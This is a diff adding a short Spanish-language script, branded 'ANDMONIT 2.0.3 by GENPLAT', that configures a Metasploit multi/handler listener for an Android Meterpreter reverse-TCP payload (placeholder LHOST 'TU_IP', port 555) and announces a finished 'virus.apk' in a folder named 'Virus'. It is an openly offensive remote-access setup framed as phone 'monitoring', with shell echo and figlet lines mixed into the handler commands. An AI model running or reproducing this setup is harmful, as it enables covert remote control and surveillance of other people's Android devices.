@@ -1,0 +1,16 @@
+figlet ANDMONIT 2.0.3
+figlet CARGANDO...
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST TU_IP
+set LPORT 555
+exploit -j
+echo PROCESO DE INICIO DE MONITOREO EN CURSO...
+echo PROCESO DE INICIO DE MONITOREO EN CURSO...
+echo PROCESO DE INICIO DE MONITOREO EN CURSO...
+figlet ANDMOIT 2.0.3
+figlet BY GENPLAT
+echo APK LISTA!
+echo MONITOREO LISTO!
+echo [!]APK UBICADA EN /home/genplat/Escritorio/Virus/virus.apk
+echo GENPLAT ANDMONIT HACK 2.0.3 LISTO
